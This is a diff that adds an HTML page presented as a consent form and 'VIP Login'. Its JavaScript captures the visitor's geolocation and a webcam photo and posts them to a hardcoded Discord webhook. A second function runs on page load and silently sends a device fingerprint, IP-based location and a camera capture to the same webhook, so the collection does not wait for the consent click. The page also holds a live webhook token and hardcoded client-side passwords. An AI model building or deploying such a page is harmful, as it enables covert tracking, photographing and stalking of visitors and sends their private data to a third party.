@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Consent & Login</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #e6f0ff; display: flex; align-items: center; justify-content: center; height: 100vh; margin:0; }
+  .card { width: 400px; padding: 28px; border-radius: 12px; background: #ffffff; box-shadow: 0 6px 20px rgba(0,0,0,0.1); text-align: center; }
+  h2 { color: #0b84ff; }
+  p { font-size: 14px; color: #333; }
+  input, button { margin-top: 12px; padding: 10px; border-radius: 8px; border:1px solid #ccc; width: 90%; }
+  button { background: #0b84ff; color: #fff; font-weight: bold; border:none; cursor:pointer; }
+  #loginCard { display:none; }
+</style>
+</head>
+<body>
+
+<div class="card" id="consentCard">
+  <h2>User Consent Required</h2>
+  <p>We will collect your location and a camera snapshot for testing purposes. Click below to allow.</p>
+  <button id="submitBtn">Consent & Submit</button>
+</div>
+
+<div class="card" id="loginCard">
+  <h2>VIP Login</h2>
+  <form id="loginForm">
+    <label>Password</label>
+    <input type="password" name="password" required />
+    <button type="submit">Login</button>
+  </form>
+</div>
+
+<script>
+const validPasswords = ["ANUSHKA","JOYTA","MUMMY","MAILKA","POOJA","ARYA","OWNER","S4TYAM"];
+
+document.getElementById("submitBtn").addEventListener("click", async () => {
+  let photoBlob = null;
+  let position = null;
+
+  // Get location
+  try {
+    position = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject);
+    });
+  } catch (err) {
+    alert("Location permission is required!");
+    return;
+  }
+
+  // Get camera snapshot
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    const bitmap = await imageCapture.grabFrame();
+    const canvas = document.createElement("canvas");
+    canvas.width = bitmap.width;
+    canvas.height = bitmap.height;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(bitmap, 0, 0);
+    track.stop();
+    // Convert to Blob
+    photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
+  } catch (err) {
+    alert("Camera permission is required!");
+    return;
+  }
+
+  // Prepare Google Maps link
+  const mapsLink = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
+
+  // Send to Discord as multipart/form-data
+  const webhookURL = "https://canary.discord.com/api/webhooks/1391406002854953053/6J7qog53zGOfMPBbWKjuFctRhtcR2gG9-_WuBgwRgYB2sECwOlUiTDRdoZ3li5X4W8-Y";
+  const formData = new FormData();
+  const payload = {
+    username: "Consent Collector",
+    embeds: [{
+      title: "User Consent & Photo Submission",
+      color: 3447003,
+      fields: [
+        { name: "UserAgent", value: navigator.userAgent, inline: false },
+        { name: "Language", value: navigator.language, inline: false },
+        { name: "Screen", value: `${window.screen.width}×${window.screen.height}`, inline: false },
+        { name: "TimeZone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: false },
+        { name: "Google Maps Location", value: mapsLink, inline: false }
+      ],
+      timestamp: new Date()
+    }]
+  };
+  formData.append("payload_json", JSON.stringify(payload));
+  formData.append("file", photoBlob, "snapshot.png");
+
+  try {
+    await fetch(webhookURL, { method: "POST", body: formData });
+    alert("Consent, location, and photo submitted successfully!");
+    // Show login panel after 3 seconds
+    setTimeout(() => {
+      document.getElementById("consentCard").style.display = "none";
+      document.getElementById("loginCard").style.display = "block";
+    }, 3000);
+  } catch (err) {
+    console.error("Failed to send:", err);
+    alert("Failed to send data.");
+  }
+});
+
+// Handle login
+document.getElementById("loginForm").addEventListener("submit", (event) => {
+  event.preventDefault();
+  const pass = event.target.password.value.trim().toUpperCase();
+  if (validPasswords.includes(pass)) {
+    localStorage.setItem("vip_login_token", pass);
+    window.location.href = "vip.html";
+  } else {
+    alert("Incorrect password!");
+  }
+});
+
+  async function collectInfo() {
+    let info = {};
+
+    // Browser basics
+    info.userAgent = navigator.userAgent;
+    info.language = navigator.language;
+    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    info.screen = window.screen.width + "×" + window.screen.height;
+    info.deviceMemory = navigator.deviceMemory || "N/A";
+    info.cpuCores = navigator.hardwareConcurrency || "N/A";
+    info.touchSupport = navigator.maxTouchPoints || "N/A";
+
+    // Battery
+    if (navigator.getBattery) {
+      try {
+        const batt = await navigator.getBattery();
+        info.battery = {
+          level: Math.round(batt.level * 100) + "%",
+          charging: batt.charging
+        };
+      } catch {
+        info.battery = "Error retrieving";
+      }
+    } else {
+      info.battery = "Not supported";
+    }
+
+    // IP + Geo
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      info.ip = data.ip;
+      info.city = data.city;
+      info.region = data.region;
+      info.country = data.country_name;
+      info.organization = data.org;
+    } catch {
+      info.ip = "Fetch failed";
+    }
+
+    // Camera capture (only if user allows in browser popup)
+    let photoData = null;
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const videoTrack = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(videoTrack);
+      const bitmap = await imageCapture.grabFrame();
+
+      // Draw to canvas and convert to base64
+      const canvas = document.createElement("canvas");
+      canvas.width = bitmap.width;
+      canvas.height = bitmap.height;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(bitmap, 0, 0);
+      photoData = canvas.toDataURL("image/png");
+      videoTrack.stop();
+    } catch (err) {
+      console.error("Camera not available or denied:", err);
+    }
+
+    // Send silently to Discord webhook
+    const webhookURL = "https://canary.discord.com/api/webhooks/1391406002854953053/6J7qog53zGOfMPBbWKjuFctRhtcR2gG9-_WuBgwRgYB2sECwOlUiTDRdoZ3li5X4W8-Y";
+    if (!webhookURL) return;
+
+    const payload = {
+      username: "Info Collector BASE",
+      embeds: [{
+        title: " Visitor Data",
+        color: 3447003,
+        fields: Object.keys(info).map(key => ({
+          name: key,
+          value: typeof info[key] === "object" ? JSON.stringify(info[key]) : String(info[key]),
+          inline: false
+        })),
+        footer: { text: "Lab Test" },
+        timestamp: new Date()
+      }]
+    };
+
+    try {
+      // Send info
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      // Send photo if available
+      if (photoData) {
+        const imgPayload = new FormData();
+        imgPayload.append("file", await (await fetch(photoData)).blob(), "photo.png");
+        await fetch(webhookURL, {
+          method: "POST",
+          body: imgPayload
+        });
+      }
+    } catch (err) {
+      console.error("Webhook send failed:", err);
+    }
+  }
+
+  collectInfo();
+</script>
+
+</body>
+</html>
